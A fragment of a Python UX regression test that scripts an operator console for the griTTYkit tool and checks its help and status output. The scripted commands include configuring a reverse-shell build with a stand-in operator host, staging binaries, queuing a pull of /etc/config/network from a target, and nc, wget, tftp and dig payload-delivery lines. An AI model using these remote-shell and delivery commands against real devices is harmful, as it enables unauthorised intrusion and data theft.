                "back\n"
                "listeners\n"
                "999\n"
                f"route add zz-console-added {line_console_added_route_port} 127.0.0.1 {line_console_added_route_dest_port} operator:{line_console_added_route_port}=rack-hop:9100 rack-hop:9100=127.0.0.1:{line_console_added_route_dest_port}\n"
                "show routes\n"
                "show routes -v\n"
                "route start 2\n"
                "route stop 2\n"
                "routes -v\n"
                "route delete 2\n"
                "use 1\n"
                "info\n"
                "next\n"
                "back\n"
                "route print\n"
                "route console-route\n"
                "info\n"
                "options\n"
                "back\n"
                "show categories\n"
                "categories\n"
                "show service modules\n"
                "use 1\n"
                "next\n"
                "back\n"
                "show daemon modules\n"
                "show target modules\n"
                "show workbench modules\n"
                "show modules daemon\n"
                "modules file-service\n"
                "show service modules -v\n"
                "use 1\n"
                "?\n"
                "info\n"
                "next\n"
                "options\n"
                "background\n"
                "show options\n"
                "commands\n"
                "copy 1\n"
                "build\n"
                "build -v\n"
                "build set GRIT_RUNTIME_ROOT /tmp/grit-build\n"
                "build unset GRIT_RUNTIME_ROOT\n"
                "setg GRIT_RUNTIME_ROOT /tmp/grit-global\n"
                "show options\n"
                "unsetg GRIT_RUNTIME_ROOT\n"
                "show options\n"
                "listeners\n"
                "listeners -v\n"
                "listener file-service\n"
                "options\n"
                "set 1 22231\n"
                "back\n"
                "set GRIT_OPERATOR_FILE_SERVICE_TLS no\n"
                "agents\n"
                "routes\n"
                "daemon\n"
                "daemon -v\n"
                "jobs -k missing-job\n"
                "jobs\n"
                "jobs -v\n"
                "jobs -i 1\n"
                "info\n"
                "options\n"
                "next\n"
                "back\n"
                "search line-console-job\n"
                "use 1\n"
                "job line-console-job\n"
                "background\n"
                "daemon status --dry-run\n"
                "show actions\n"
                "check operator-daemon-status\n"
                "run operator-daemon-status --dry-run\n"
                "back\n"
                "usemodule operator-daemon-status\n"
                "execute --dry-run\n"
                "back\n"
                "uselistener file-service\n"
                "back\n"
                "useroute console-route\n"
                "back\n"
                "use module operator-daemon-status\n"
                "info\n"
                "next\n"
                "check\n"
                "run --dry-run\n"
                "back\n"
                "run -j\n"
                "use listener file-service\n"
                "info\n"
                "next\n"
                "back\n"
                "services\n"
                "sessions\n"
                "sessions -l\n"
                "sessions -v\n"
                "sessions -i 1\n"
                "interact 1\n"
                f"view {line_console_session / 'session.log'}\n"
                "use session 1\n"
                "info\n"
                "options\n"
                "next\n"
                "interact\n"
                "back\n"
                "usesession 1\n"
                "background\n"
                "targets\n"
                "useagent Console Router\n"
                "interact\n"
                "clear target\n"
                "agent Console Router\n"
                "interact\n"
                "clear target\n"
                "use agent Console Router\n"
                "next\n"
                "b\n"
                "b\n"
                "use agent Console Router\n"
                "main\n"
                "use agent Console Router\n"
                "?\n"
                "rename Console Router\n"
                "note Console quick note\n"
                "alias console-alias\n"
                "search Console Router\n"
                "mailbox\n"
                "mailbox ?\n"
                "mailbox targets\n"
                "queue\n"
                "show queue -v\n"
                "use 1\n"
                "show options\n"
                "set target.notes Rack shelf A\n"
                "set target.alias console-alias\n"
                "show options\n"
                "unset target.notes\n"
                "show activity\n"
                "queue grit survey --json\n"
                "queue result 1\n"
                "queue list\n"
                "events -n 3\n"
                "events service=workbench -n 2\n"
                "probe\n"
                "wat\n"
                "?\n"
                "help\n"
                "back\n"
                "probe delivery\n"
                "probe paste\n"
                "probe paste --base64\n"
                "probe --queue\n"
                "download --queue /etc/config/network\n"
                "show mailbox\n"
                "show mailbox -v\n"
                f"upload --start {line_console_upload} console-upload\n"
                "fetch --queue console-upload\n"
                "stop file-service\n"
                "downloads\n"
                f"serve-binary --start {line_console_binary} grit-console\n"
                "configure grit-console --operator-host 192.0.2.44 --transport builtin --zero-arg-mode rshell --command-queue-enable yes --command-queue-poll-interval 60\n"
                "stop file-service\n"
                "show stagers\n"
                "stagers\n"
                "files\n"
                "unstage console-upload\n"
                "rmfile missing-upload\n"
                "stagers\n"
                "?\n"
                "back\n"
                "show mailbox\n"
                "queue clear --confirm\n"
                "queue list\n"
                "clear target\n"
                "use agent Console Router\n"
                "q\n"
                "q\n"
                "q\n"
            ).encode("utf-8"),
        )
        line_console_chunks = []
        deadline = time.time() + 24
        while line_console_proc.poll() is None and time.time() < deadline:
            ready, _, _ = select.select([line_console_master], [], [], 0.1)
            if ready:
                try:
                    line_console_chunks.append(os.read(line_console_master, 65536).decode("utf-8", errors="replace"))
                except OSError:
                    break
        if line_console_proc.poll() is None:
            try:
                os.write(line_console_master, b"q\n")
            except OSError:
                pass
            quit_deadline = time.time() + 3
            while line_console_proc.poll() is None and time.time() < quit_deadline:
                ready, _, _ = select.select([line_console_master], [], [], 0.1)
                if ready:
                    try:
                        line_console_chunks.append(os.read(line_console_master, 65536).decode("utf-8", errors="replace"))
                    except OSError:
                        break
        if line_console_proc.poll() is None:
            line_console_proc.terminate()
            try:
                line_console_proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                line_console_proc.kill()
                line_console_proc.wait(timeout=2)
        line_console_stdout = "".join(line_console_chunks)
        line_console_stderr = line_console_proc.stderr.read()
    finally:
        if line_console_slave != -1:
            os.close(line_console_slave)
        try:
            os.close(line_console_master)
        except OSError:
            pass
    line_console_artifact_dir_path = write_line_console_artifacts(
        line_console_stdout,
        line_console_stderr,
        line_console_proc.returncode,
        summary={
            "section": "line-console",
            "config": str(upload_cfg),
            "state_file": str(line_console_state),
            "staged_file": str(line_console_staged),
            "bridge_profiles_file": str(line_console_routes),
        },
    )
    if (not (line_console_artifact_dir_path / "transcript.txt").is_file() or
            not (line_console_artifact_dir_path / "stderr.txt").is_file() or
            not (line_console_artifact_dir_path / "summary.json").is_file()):
        print("line-console transcript artifacts were not written", file=sys.stderr)
        return 1
    line_console_artifact_summary = json.loads(
        (line_console_artifact_dir_path / "summary.json").read_text(encoding="utf-8")
    )
    bad_artifact_flags = [
        key for key in (
            "traceback_present",
            "raw_python_repr_present",
            "raw_action_state_present",
            "literal_ctrl_c_present",
            "headless_command_default_spam_present",
            "stale_numbered_result_error_present",
            "verbose_policy_dump_present",
        )
        if line_console_artifact_summary.get(key)
    ]
    if line_console_artifact_summary.get("returncode") != 0 or bad_artifact_flags:
        print("line-console transcript artifact recorded UX regression flags", file=sys.stderr)
        print(json.dumps(line_console_artifact_summary, indent=2, sort_keys=True), file=sys.stderr)
        return 1
    blank_enter_match = re.search(
        r"grit\[all\]>[ \t]*\r?\n"
        r"grit\[all\]> help",
        line_console_stdout,
    )
    if not blank_enter_match:
        print("line-oriented blank Enter rerendered output instead of showing a fresh prompt", file=sys.stderr)
        print(line_console_stdout[:2000], file=sys.stderr)
        return 1
    line_console_session_markers = [
        "selected session ",
        "grit[all]/session/",
        "Session: 20260101T000000-file-service",
        "service: file-service",
        "commands: info, options, interact, sessions -v, background",
    ]
    line_console_missing_markers = [
        marker for marker in line_console_session_markers
        if marker not in line_console_stdout
    ]
    line_console_required_markers = [
        "Console help topics:",
        "Usage:",
        "  help <topic>",
        "Topics:",
        "Operator workspace",
        "Target work",
        "Control plane",
        "actions    operator modules, dry-run/run, background jobs",
        "Console",
        "Tip: use `search TERM` to find agents, listeners, modules, sessions, jobs, files, and queue records.",
        "next: ? help  |  targets (1)  |  use N  |  search TERM",
        "Help: files",
        "Help: queue",
        "Help: events",
        "Help: actions",
        "grit[all]/action/bridge:inspect-status> ?",
        "Help: actions — selected operator modules and workflows",
        "grit[Console Router]> ?",
        "Help: targets — target agents, mailbox, and activity",
        "grit[Console Router]/probe> ?",
        "Help: probe — lightweight shell probe (no griTTYkit required)",
        "grit[Console Router]/files> ?",
        "Help: files — staging and serving files to targets",
        "Route model: the target connects to LPORT on the operator; the operator bridge forwards to DEST_HOST:DEST_PORT.",
        "DEST_HOST:DEST_PORT is the endpoint visible from the operator/server running grit-console.",
        "Use hops to document the path the target uses to reach the operator listener; hops do not change the TCP relay destination.",
        "route add NAME LISTEN_PORT DEST_HOST DEST_PORT [FROM=TO ...]",
        "Direct target-to-operator SSH: route add ssh-home 2222 127.0.0.1 22 target:2222=operator:2222",
        "Meaning: target connects to operator:2222; operator forwards that connection to 127.0.0.1:22.",
        "Multi-hop web admin: route add web-hop 8080 192.168.1.1 80 target:8080=jump:9001 jump:9001=operator:8080",
        "Meaning: target reaches jump:9001, jump reaches operator:8080; operator forwards to 192.168.1.1:80.",
        "Completions for <root>:",
        "numbered result not found: 999; run a list command first, then use N",
        "resource ",
        "Workspace",
        "Events  (",
        "Raw JSONL: view ",
        "filters: limit=2 service=workbench",
        "Delivery options (pick what the target has):",
        "nc:    printf 'GET /probe.sh HTTP/1.0",
        "tftp:  tftp -g -r probe.sh",
        "ftp:   wget -O- ftp://",
        "dns:   dig @",
        "Current listeners: probe-http, probe-tftp, probe-ftp, probe-dns",
        "DNS note: nslookup usually needs DNS exposed on port 53; dig can use custom ports.",
        "paste: probe paste",
        "Serial/manual paste:",
        "sh <<'GRIT_PROBE_SCRIPT'",
        "bb_payload=\"schema=1&script=probe.sh",
        "Serial/manual base64 paste:",
        "bb_probe_b64=$(cat <<'GRIT_PROBE_B64'",
        "base64 decoder not found",
        "After it runs, use: probe results",
        "daemon -v for commands",
        "dry-run: scripts/grit-console --config",
        "saved route: zz-console-added",
        "started route zz-console-added",
        "stopped route zz-console-added",
        "deleted route zz-console-added",
        "selected route console-route",
        "configured: ",
        "command-queue (",
        "build option set: GRIT_RUNTIME_ROOT",
        "global build option set: GRIT_RUNTIME_ROOT",
        "set GRIT_OPERATOR_FILE_SERVICE_PORT=\"22231\"",
        "set GRIT_OPERATOR_FILE_SERVICE_TLS=\"no\"",
        "operator daemon workflow action: operator-daemon-status",
        "Session interaction:",
        "Agent interaction: line-console-target label=Console Router state=online",
        "renamed target: line-console-target",
        "noted target: line-console-target",
        "aliased target: line-console-target",
        "Command queue  (",
        "queued cq-",
        "Command result:",
        "result: none",
        "Probe  ",
        "wget:  wget -O- ",
        "Target download command:",
        "target path: /etc/config/network",
        "File staged for target fetch:",
        "Staged fetch command:",
        "griTTYkit binary staged for target fetch:",
        "Artifact trailer configured:",
        "keys: GRIT_OPERATOR_SERVER_HOST, GRIT_RSHELL_TRANSPORT, GRIT_ZERO_ARG_MODE, GRIT_COMMAND_QUEUE_ENABLE, GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC",
        "target fetch: grit fetch grit-console",
        "run hint: chmod +x ./grit-console && ./grit-console --help",
        "unstaged console-upload",
        "not staged missing-upload",
        "Mailbox  (",
        "cleared ",
        "no queued commands",
        "target filter cleared",
    ]
    line_console_missing_required = [
        marker for marker in line_console_required_markers
        if marker not in line_console_stdout
    ]
    if ("Traceback" in (line_console_stderr or "") or line_console_missing_required):
        print("line-oriented console commands did not expose expected UX", file=sys.stderr)
        print(f"missing line console markers: {line_console_missing_required}", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        print(line_console_stderr or "", file=sys.stderr)
        return 1
    help_modules_start = line_console_stdout.find("grit[all]> help modules")
    help_modules_end = line_console_stdout.find("grit[all]> help routes", help_modules_start + 1)
    help_modules_text = line_console_stdout[help_modules_start:help_modules_end] if help_modules_start != -1 and help_modules_end != -1 else ""
    help_routes_start = line_console_stdout.find("grit[all]> help routes")
    help_routes_end = line_console_stdout.find("grit[all]> help next", help_routes_start + 1)
    help_routes_text = line_console_stdout[help_routes_start:help_routes_end] if help_routes_start != -1 and help_routes_end != -1 else ""
    if (not help_modules_text or
            "show modules -v [FILTER]" not in help_modules_text or
            not help_routes_text or
            "routes -v" not in help_routes_text or
            "show selected route context and headless commands" in help_routes_text):
        print("line-oriented help text is stale for verbose command/detail views", file=sys.stderr)
        print("help modules:", file=sys.stderr)
        print(help_modules_text or line_console_stdout, file=sys.stderr)
        print("help routes:", file=sys.stderr)
        print(help_routes_text, file=sys.stderr)
        return 1
    probe_context_help_start = line_console_stdout.find("grit[Console Router]/probe> ?")
    probe_context_help_end = line_console_stdout.find("grit[Console Router]/probe> back", probe_context_help_start + 1)
    probe_context_help_text = (
        line_console_stdout[probe_context_help_start:probe_context_help_end]
        if probe_context_help_start != -1 and probe_context_help_end != -1 else ""
    )
    if (not probe_context_help_text or
            "Help: probe" not in probe_context_help_text or
            "Console help topics:" in probe_context_help_text):
        print("line-oriented bare ? did not use probe breadcrumb context", file=sys.stderr)
        print(probe_context_help_text or line_console_stdout, file=sys.stderr)
        return 1
    probe_unknown_start = line_console_stdout.find("grit[Console Router]/probe> wat")
    probe_unknown_end = line_console_stdout.find("grit[Console Router]/probe> ?", probe_unknown_start + 1)
    probe_unknown_text = (
        line_console_stdout[probe_unknown_start:probe_unknown_end]
        if probe_unknown_start != -1 and probe_unknown_end != -1 else ""
    )
    if (not probe_unknown_text or
            "unknown command: wat; type ? for probe help" not in probe_unknown_text or
            "type help" in probe_unknown_text):
        print("line-oriented unknown command did not point at contextual help", file=sys.stderr)
        print(probe_unknown_text or line_console_stdout, file=sys.stderr)
        return 1
    probe_context_bare_help_start = line_console_stdout.find("grit[Console Router]/probe> help")
    probe_context_bare_help_end = line_console_stdout.find("grit[Console Router]/probe> back", probe_context_bare_help_start + 1)
    probe_context_bare_help_text = (
        line_console_stdout[probe_context_bare_help_start:probe_context_bare_help_end]
        if probe_context_bare_help_start != -1 and probe_context_bare_help_end != -1 else ""
    )
    if (not probe_context_bare_help_text or
            "Help: probe" not in probe_context_bare_help_text or
            "Console help topics:" in probe_context_bare_help_text):
        print("line-oriented bare help did not use probe breadcrumb context", file=sys.stderr)
        print(probe_context_bare_help_text or line_console_stdout, file=sys.stderr)
        return 1
    target_context_help_start = line_console_stdout.find("grit[Console Router]> ?")
    target_context_help_end = line_console_stdout.find("grit[Console Router]> rename", target_context_help_start + 1)
    target_context_help_text = (
        line_console_stdout[target_context_help_start:target_context_help_end]
        if target_context_help_start != -1 and target_context_help_end != -1 else ""
    )
    if (not target_context_help_text or
            "Help: targets" not in target_context_help_text or
            "Console help topics:" in target_context_help_text):
        print("line-oriented bare ? did not use selected target context", file=sys.stderr)
        print(target_context_help_text or line_console_stdout, file=sys.stderr)
        return 1
    files_context_help_start = line_console_stdout.find("grit[Console Router]/files> ?")
    files_context_help_end = line_console_stdout.find("grit[Console Router]/files> back", files_context_help_start + 1)
    files_context_help_text = (
        line_console_stdout[files_context_help_start:files_context_help_end]
        if files_context_help_start != -1 and files_context_help_end != -1 else ""
    )
    if (not files_context_help_text or
            "Help: files" not in files_context_help_text or
            "Console help topics:" in files_context_help_text):
        print("line-oriented bare ? did not use files breadcrumb context", file=sys.stderr)
        print(files_context_help_text or line_console_stdout, file=sys.stderr)
        return 1
    probe_queue_start = line_console_stdout.find("grit[Console Router]/probe> probe --queue")
    probe_queue_end = line_console_stdout.find("grit[Console Router]/probe> download --queue", probe_queue_start + 1)
    probe_queue_text = line_console_stdout[probe_queue_start:probe_queue_end] if probe_queue_start != -1 and probe_queue_end != -1 else ""
    if (not probe_queue_text or
            "  queued: cq-" not in probe_queue_text or
            "  target: line-console-target (Console Router)" not in probe_queue_text or
            "for target=" in probe_queue_text or
            " label=" in probe_queue_text):
        print("line-oriented probe queue output did not use concise labels", file=sys.stderr)
        print(probe_queue_text or line_console_stdout, file=sys.stderr)
        return 1
    main_start = line_console_stdout.find("grit[Console Router]> main")
    main_end = line_console_stdout.find("grit[all]> use agent Console Router", main_start + 1)
    main_text = line_console_stdout[main_start:main_end] if main_start != -1 and main_end != -1 else ""
    if (not main_text or
            "returned to main workspace" not in main_text or
            "  next: workspace, agents, listeners, routes, sessions, show categories" not in main_text or
            "  cleared module:" in main_text or
            "  cleared target:" in main_text or
            "cleared_module=" in main_text or
            "cleared_target=" in main_text):
        print("line-oriented main command did not use concise reset labels", file=sys.stderr)
        print(main_text or line_console_stdout, file=sys.stderr)
        return 1
    target_back_start = line_console_stdout.find("grit[Console Router]/targets> b")
    target_back_end = line_console_stdout.find("grit[all]> use agent Console Router", target_back_start + 1)
    target_back_text = line_console_stdout[target_back_start:target_back_end] if target_back_start != -1 and target_back_end != -1 else ""
    if (not target_back_text or
            "grit[Console Router]> b" not in target_back_text):
        print("line-oriented b command did not step through module and target breadcrumbs", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    context_quit_start = line_console_stdout.find("grit[Console Router]/queue> q")
    context_quit_end = line_console_stdout.find("grit[all]> q", context_quit_start + 1)
    context_quit_text = (
        line_console_stdout[context_quit_start:context_quit_end]
        if context_quit_start != -1 and context_quit_end != -1 else ""
    )
    if (not context_quit_text or
            "returned to main workspace" in context_quit_text or
            "module context cleared" in context_quit_text or
            "grit[Console Router]> q" in context_quit_text):
        print("line-oriented q command did not return quietly to root from selected context", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    line_console_config = json.loads(upload_cfg.read_text(encoding="utf-8"))
    if (line_console_config.get("GRIT_OPERATOR_FILE_SERVICE_PORT") != 22231 or
            line_console_config.get("GRIT_OPERATOR_FILE_SERVICE_TLS") != "no"):
        print("line-oriented set option commands did not persist numeric or GRIT_ options", file=sys.stderr)
        print(json.dumps(line_console_config, indent=2, sort_keys=True), file=sys.stderr)
        return 1
    first_prompt = line_console_stdout.find("grit[all]>")
    help_prompt = line_console_stdout.find("grit[all]> help", first_prompt + 1)
    blank_enter_text = line_console_stdout[first_prompt:help_prompt] if first_prompt != -1 and help_prompt != -1 else ""
    if not blank_enter_text or blank_enter_text.count("griTTYkit v") != 0 or blank_enter_text.count("grit[all]>") < 1:
        print("line-oriented blank enter redrew the dashboard instead of only printing a prompt", file=sys.stderr)
        print(blank_enter_text or line_console_stdout, file=sys.stderr)
        return 1
    if "service or route not found: 1" in line_console_stdout:
        print("line-oriented console did not accept numbered start/stop listener rows", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    if "search result number out of range" in line_console_stdout:
        print("line-oriented console interpreted a normal command as a stale search result", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    if "module context cleared" in line_console_stdout:
        print("line-oriented back/q command printed noisy module-clear status", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    if "Status bar:" in line_console_stdout:
        print("line-oriented status command exposed raw status-bar fields", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    if "headless_command=" in line_console_stdout:
        print("line-oriented event summaries exposed headless command internals", file=sys.stderr)
        print(line_console_stdout, file=sys.stderr)
        return 1
    for noisy in ("route.inspect_command=scripts/grit-console", "route.start_command=scripts/grit-console",
                  "route.stop_command=scripts/grit-console", "action.command=scripts/grit-console",
                  "action.dry_run_command=scripts/grit-console", "action.start_job_command=scripts/grit-console"):
        if noisy in line_console_stdout:
            print(f"line-oriented console context exposed noisy equivalent CLI command: {noisy}", file=sys.stderr)
            print(line_console_stdout, file=sys.stderr)
            return 1
    target_interactions = []
    target_search_pos = 0
    while True:
        target_interaction_start = line_console_stdout.find("grit[Console Router]/targets> interact", target_search_pos)
        if target_interaction_start == -1:
            break
        target_interaction_end = line_console_stdout.find(
            "grit[Console Router]/targets> clear target",
            target_interaction_start + 1,
        )
        target_interactions.append(
            line_console_stdout[target_interaction_start:target_interaction_end]
            if target_interaction_end != -1 else ""
        )
        target_search_pos = target_interaction_start + 1
    if (len(target_interactions) < 2 or
            any(not text or "Agent interaction: line-console-target label=Console Router state=online" not in text
                for text in target_interactions[:2]) or
            any("status_command: scripts/grit-console" in text for text in target_interactions[:2]) or
            any("pending work:" not in text or "recent sessions:" not in text for text in target_interactions[:2])):
        print("line-oriented target interaction exposed generated status command or lost concise details", file=sys.stderr)
        print("\n--- target interaction ---\n".join(target_interactions) or line_console_stdout, file=sys.stderr)
        return 1
    service_modules_start = line_console_stdout.find("grit[all]/categories> show service modules")
    service_modules_end = line_console_stdout.find("grit[all]> show daemon modules", service_modules_start + 1)
    service_modules_text = line_console_stdout[service_modules_start:service_modules_end] if service_modules_start != -1 and service_modules_end != -1 else ""
    service_modules_verbose_start = line_console_stdout.find("grit[all]/modules> show service modules -v")
    service_modules_verbose_end = line_console_stdout.find("grit[all]/modules> use 1", service_modules_verbose_start + 1)
    service_modules_verbose_text = line_console_stdout[service_modules_verbose_start:service_modules_verbose_end] if service_modules_verbose_start != -1 and service_modules_verbose_end != -1 else ""
    if (not service_modules_text or
            "Modules  (service)" not in service_modules_text or
            "\n      run: scripts/grit-console" in service_modules_text or
            "modules -v for commands" not in service_modules_text or
            not service_modules_verbose_text or
            "\n      run: scripts/grit-console" not in service_modules_verbose_text):
        print("line-oriented module list did not keep generated commands behind verbose mode", file=sys.stderr)
        print("default service modules:", file=sys.stderr)
        print(service_modules_text or line_console_stdout, file=sys.stderr)
        print("verbose service modules:", file=sys.stderr)
        print(service_modules_verbose_text, file=sys.stderr)
        return 1
    action_help_start = line_console_stdout.find("grit[all]/action/bridge:inspect-status> ?")
    action_help_end = line_console_stdout.find("grit[all]/action/bridge:inspect-status> info", action_help_start + 1)
    action_help_text = line_console_stdout[action_help_start:action_help_end] if action_help_start != -1 and action_help_end != -1 else ""
    if (not action_help_text or
            "Help: actions" not in action_help_text or
            "use module NAME" not in action_help_text or
            "check [MODULE]" not in action_help_text or
            "Help: console" in action_help_text):
        print("line-oriented action context help fell back to generic console help", file=sys.stderr)
        print(action_help_text or line_console_stdout, file=sys.stderr)
        return 1
    action_info_start = line_console_stdout.find("grit[all]/action/bridge:inspect-status> info")
    action_info_end = line_console_stdout.find("grit[all]/action/bridge:inspect-status> next", action_info_start + 1)
    action_info_text = line_console_stdout[action_info_start:action_info_end] if action_info_start != -1 and action_info_end != -1 else ""
    if (not action_info_text or
            "Console context:" not in action_info_text or
            "  prompt: grit[all]/action/bridge:inspect-status>" not in action_info_text or
            "  module: action/bridge:inspect-status" not in action_info_text or
            "Action: service:bridge:inspect-status" not in action_info_text or
            "  state: ready" not in action_info_text or
            "  reason: run-now" not in action_info_text or
            "  confirmation: not required" not in action_info_text or
            "  background: not supported" not in action_info_text or
            "prompt=" in action_info_text or
            "module=" in action_info_text or
            "action=" in action_info_text or
            "confirm=" in action_info_text):
        print("line-oriented action info did not use concise labels", file=sys.stderr)
        print(action_info_text or line_console_stdout, file=sys.stderr)
        return 1
    action_options_start = line_console_stdout.find("grit[all]/action/bridge:inspect-status> options")
    action_options_end = line_console_stdout.find("grit[all]/action/bridge:inspect-status> background", action_options_start + 1)
    action_options_text = line_console_stdout[action_options_start:action_options_end] if action_options_start != -1 and action_options_end != -1 else ""
    action_option_labels = (
        "Action: service:bridge:inspect-status",
        "  label: Inspect bridge service status",
        "  category: inspect",
        "  workflow: service-lifecycle",
        "  state: ready",
        "  reason: run-now",
        "  confirmation: not required",
        "  background: not supported",
        "  commands: check, run, run --dry-run, run --confirm",
        "  next: info, check, run, back",
    )
    action_options_noisy = (
        "action.kind=",
        "action.id=",
        "action.label=",
        "action.category=",
        "action.workflow=",
        "action.state=",
        "action.reason=",
        "action.requires_confirmation=",
        "action.background_supported=",
        "action.commands=",
        "action.next=",
    )
    if (not action_options_text or
            any(label not in action_options_text for label in action_option_labels) or
            any(noisy in action_options_text for noisy in action_options_noisy)):
        print("line-oriented action options did not use concise labels", file=sys.stderr)
        print(action_options_text or line_console_stdout, file=sys.stderr)
        return 1
    route_start = line_console_stdout.find("saved route: zz-console-added")
    route_end = line_console_stdout.find("selected route console-route", route_start + 1)
    route_text = line_console_stdout[route_start:route_end] if route_start != -1 and route_end != -1 else ""
    if (not route_text or
            "saved route: zz-console-added" not in route_text or
            "  path: operator:" not in route_text or
            "  listen: 127.0.0.1:" not in route_text or
            "  destination: 127.0.0.1:" not in route_text or
            "  hops: 2" not in route_text or
            "  multi-hop: yes" not in route_text or
            "started route zz-console-added" not in route_text or
            "stopped route zz-console-added" not in route_text or
            "deleted route zz-console-added" not in route_text or
            "listen=" in route_text or
            "dest=" in route_text or
            "hops=" in route_text or
            "multi_hop=" in route_text or
            "headless_command:" in route_text):
        print("line-oriented route commands exposed noisy headless commands", file=sys.stderr)
        print(route_text or line_console_stdout, file=sys.stderr)
        return 1
    routes_verbose_start = line_console_stdout.find("grit[all]/routes> routes -v")
    routes_verbose_end = line_console_stdout.find("grit[all]/routes> route delete 2", routes_verbose_start + 1)
    routes_verbose_text = line_console_stdout[routes_verbose_start:routes_verbose_end] if routes_verbose_start != -1 and routes_verbose_end != -1 else ""
    show_routes_verbose_start = line_console_stdout.find("grit[all]/routes> show routes -v")
    show_routes_verbose_end = line_console_stdout.find("grit[all]/routes> route start 2", show_routes_verbose_start + 1)
    show_routes_verbose_text = (
        line_console_stdout[show_routes_verbose_start:show_routes_verbose_end]
        if show_routes_verbose_start != -1 and show_routes_verbose_end != -1 else ""
    )
    route_print_start = line_console_stdout.find("grit[all]/routes> route print")
    route_print_end = line_console_stdout.find("grit[all]/routes> route console-route", route_print_start + 1)
    route_print_text = line_console_stdout[route_print_start:route_print_end] if route_print_start != -1 and route_print_end != -1 else ""
    if (not routes_verbose_text or
            "\n     start: scripts/grit-console" not in routes_verbose_text or
            not show_routes_verbose_text or
            "\n     start: scripts/grit-console" not in show_routes_verbose_text or
            not route_print_text or
            "\n     start: scripts/grit-console" in route_print_text):
        print("line-oriented route print did not keep generated commands behind verbose mode", file=sys.stderr)
        print("routes -v:", file=sys.stderr)
        print(routes_verbose_text or line_console_stdout, file=sys.stderr)
        print("show routes -v:", file=sys.stderr)
        print(show_routes_verbose_text, file=sys.stderr)
        print("route print:", file=sys.stderr)
        print(route_print_text, file=sys.stderr)
        return 1
    route_context_start = line_console_stdout.find("grit[all]/routes> route console-route")
    route_context_end = line_console_stdout.find("grit[all]/route/console-route> back", route_context_start + 1)
    route_context_text = line_console_stdout[route_context_start:route_context_end] if route_context_start != -1 and route_context_end != -1 else ""
    route_context_labels = (
        "Route: console-route",
        "  listen: ",
        "  destination: 127.0.0.1:",
        "  path: ",
        "  state: ",
        "  active: ",
        "  hops: 2",
        "  multi-hop: yes",
        "  target: line-console-target",
        "  commands: route console-route, route start console-route, route stop console-route, route delete console-route",
        "  next: options, start, stop, routes -v, back",
    )
    route_context_noisy = (
        "state=",
        "active=",
        "listen=",
        "dest=",
        "route_path=",
        "hops=",
        "multi_hop=",
        "route.name=",
        "route.listen=",
        "route.destination=",
        "route.route_path=",
        "route.state=",
        "route.active=",
        "route.hop_count=",
        "route.multi_hop=",
        "route.target_id=",
        "route.commands=",
        "route.next=",
    )
    if (not route_context_text or
            any(label not in route_context_text for label in route_context_labels) or
            any(noisy in route_context_text for noisy in route_context_noisy)):
        print("line-oriented route context did not use concise labels", file=sys.stderr)
        print(route_context_text or line_console_stdout, file=sys.stderr)
        return 1
    generated_copy_start = line_console_stdout.find("grit[all]> copy 1")
    generated_copy_end = line_console_stdout.find("grit[all]> build", generated_copy_start + 1)
    generated_copy_text = line_console_stdout[generated_copy_start:generated_copy_end] if generated_copy_start != -1 and generated_copy_end != -1 else ""
    if (not generated_copy_text or "copied command to " not in generated_copy_text or
            "headless_command:" in generated_copy_text):
        print("line-oriented generated command copy exposed noisy headless command", file=sys.stderr)
        print(generated_copy_text or line_console_stdout, file=sys.stderr)
        return 1
    build_view_start = line_console_stdout.find("grit[all]> build")
    build_view_end = line_console_stdout.find("grit[all]/build> build -v", build_view_start + 1)
    build_view_text = line_console_stdout[build_view_start:build_view_end] if build_view_start != -1 and build_view_end != -1 else ""
    if (not build_view_text or
            "configured: " not in build_view_text or
            "state: set=configured" not in build_view_text or
            "runtime (" not in build_view_text or
            "command-queue (" not in build_view_text or
            "State" not in build_view_text or
            "Opts" not in build_view_text or
            "Purpose" not in build_view_text or
            "options:" in build_view_text or
            "set: build set" in build_view_text or
            "--set-build-config" in build_view_text or
            "headless_command:" in build_view_text):
        print("line-oriented build config view was noisy or missing grouped summary", file=sys.stderr)
        print(build_view_text or line_console_stdout, file=sys.stderr)
        return 1
    build_verbose_start = line_console_stdout.find("grit[all]/build> build -v")
    build_verbose_end = line_console_stdout.find("grit[all]/build> build set GRIT_RUNTIME_ROOT /tmp/grit-build", build_verbose_start + 1)
    build_verbose_text = line_console_stdout[build_verbose_start:build_verbose_end] if build_verbose_start != -1 and build_verbose_end != -1 else ""
    if (not build_verbose_text or
            "options: static-preferred" not in build_verbose_text or
            "examples: ./.grit" not in build_verbose_text or
            "note: affects generated artifacts or payload contents" not in build_verbose_text or
            "set: build set GRIT_RUNTIME_ROOT VALUE" not in build_verbose_text or
            "--set-build-config" in build_verbose_text or
            "headless_command:" in build_verbose_text):
        print("line-oriented verbose build config view missed options or exposed headless command", file=sys.stderr)
        print(build_verbose_text or line_console_stdout, file=sys.stderr)
        return 1
    build_set_start = line_console_stdout.find("grit[all]/build> build set GRIT_RUNTIME_ROOT /tmp/grit-build")
    build_set_end = line_console_stdout.find("grit[all]/build> listeners", build_set_start + 1)
    build_set_text = line_console_stdout[build_set_start:build_set_end] if build_set_start != -1 and build_set_end != -1 else ""
    if (not build_set_text or
            "build option set: GRIT_RUNTIME_ROOT" not in build_set_text or
            "value: \"/tmp/grit-build\"" not in build_set_text or
            "build option unset: GRIT_RUNTIME_ROOT" not in build_set_text or
            "global build option set: GRIT_RUNTIME_ROOT" not in build_set_text or
            "value: \"/tmp/grit-global\"" not in build_set_text or
            "global build option unset: GRIT_RUNTIME_ROOT" not in build_set_text or
            "config: " not in build_set_text or
            "set build." in build_set_text or
            "setg GRIT_RUNTIME_ROOT=" in build_set_text or
            "config_path=" in build_set_text or
            "headless_command:" in build_set_text):
        print("line-oriented build config commands exposed noisy headless commands", file=sys.stderr)
        print(build_set_text or line_console_stdout, file=sys.stderr)
        return 1
    queue_start = line_console_stdout.find("queued cq-")
    queue_end = line_console_stdout.find("Command result:", queue_start + 1)
    queue_text = line_console_stdout[queue_start:queue_end] if queue_start != -1 and queue_end != -1 else ""
